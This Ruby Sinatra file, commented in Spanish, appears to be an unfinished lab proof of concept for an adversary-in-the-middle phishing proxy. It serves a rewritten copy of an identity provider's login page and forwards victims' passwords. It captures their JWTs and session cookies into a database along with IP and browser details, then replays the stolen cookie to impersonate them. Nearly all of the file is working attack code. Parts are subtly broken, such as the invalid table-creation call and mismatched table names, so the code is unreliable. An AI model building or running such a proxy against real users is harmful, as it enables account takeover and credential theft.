#----------------------------------
#       UNDER CONSTRUCTION
#----------------------------------

# Son como los paquetes del Go 
require 'sinatra/base'
require 'sinatra/contrib'
require 'faraday'
require 'sequel'
require 'sqlite3'
require 'dotenv/load'

#Se crea su propia DB para guardar los tokens capturados
DB = Sequel.connect("sqlite://#{__dir__}/../captured_credentials.db")

PROXY_DB?(captured_credentials) do #Verificamos si la tabla existe, si no la creamos
  primary_key :id
  String   :email        # email de la víctima
  String   :token        # el JWT capturado
  String   :ip           # IP desde donde se autenticó
  String   :user_agent   # navegador de la víctima
  DateTime :captured_at  # cuándo fue capturado
  String   :session_cookie #Captura la cookie de sesión del proxy
end

#Variables de entorno para las URLs del IdP y el Proxy
IDP_URL   = ENV['IDP_URL']   || 'http://localhost:4444'
PROXY_URL = ENV['PROXY_URL'] || 'http://localhost:4445'


#Clase para el Proxy, que se encargará de interceptar las peticiones al IdP y capturar los tokens JWT
class AvatarProxy < Sinatra::Base
  use Rack::Session::Cookie, #Se usa rack para manejar las sesiones del proxy
      key: "proxy_session",
      secret: "proxy_vaatu_secret_future_industries_poc_2024_long_enough_string"

  set :public_folder, File.join(__dir__, '..', 'public')
  set :static, true

  helpers do
    def rewrite_html(html)
      html.gsub(IDP_URL, PROXY_URL)
          .gsub("localhost:4444", "localhost:4445")
    end
  end

  get "/" do
    redirect "/login"
  end

  get "/login" do
    idp_response = Faraday.get("#{IDP_URL}/login")
    content_type 'text/html'
    rewrite_html(idp_response.body)
  end

  post "/login" do
    email    = params[:email].to_s.downcase.strip
    password = params[:password].to_s

    # Paso 1 — reenviar credenciales al IdP
    # follow_redirects: false es CRÍTICO
    # Sin esto Faraday seguiría el redirect automáticamente
    # y nunca podríamos capturar la cookie
    idp_response = Faraday.new do |f|
      f.options[:follow_redirects] = false
    end.post("#{IDP_URL}/login") do |req|
      req.headers['Content-Type'] = 'application/x-www-form-urlencoded'
      req.body = URI.encode_www_form({
        email:    email,
        password: password
      })
    end

    if idp_response.status == 302
      location = idp_response.headers['location']

      # Paso 2 — extraer el token JWT de la URL de redirect
      token = location.match(/token=(.+)/)[1] rescue nil

      # Paso 3 — extraer la cookie de sesión del IdP
      # El header Set-Cookie viene así:
      # "avatar_idp_session=abc123; path=/; HttpOnly"
      # Necesitamos solo "avatar_idp_session=abc123"
      raw_cookie    = idp_response.headers['set-cookie']
      session_cookie = raw_cookie.split(';').first rescue nil

      if token && session_cookie
        # Paso 4 — guardar token Y cookie en la DB
        DB[:captured_tokens].insert(
          email:          email,
          token:          token,
          ip:             request.ip,
          user_agent:     request.user_agent,
          session_cookie: session_cookie,
          captured_at:    Time.now
        )

        # Paso 5 — guardar en sesión del proxy
        session[:user]          = email
        session[:token]         = token
        session[:idp_cookie]    = session_cookie

        redirect "/dashboard"
      else
        idp_login = Faraday.get("#{IDP_URL}/login")
        content_type 'text/html'
        rewrite_html(idp_login.body)
      end
    else
      idp_login = Faraday.get("#{IDP_URL}/login")
      content_type 'text/html'
      rewrite_html(idp_login.body)
    end
  end

  get "/dashboard" do
    halt 401, "Not authorized" unless session[:user]

    # Paso 6 — usar la cookie robada para pedirle
    # el dashboard al IdP haciéndose pasar por la víctima
    # El IdP cree que es la víctima quien pregunta
    idp_response = Faraday.get("#{IDP_URL}/dashboard") do |req|
      req.headers['Cookie'] = session[:idp_cookie]
    end

    content_type 'text/html'
    rewrite_html(idp_response.body)
  end

  get "/logout" do
    session.clear
    redirect "/login"
  end
end
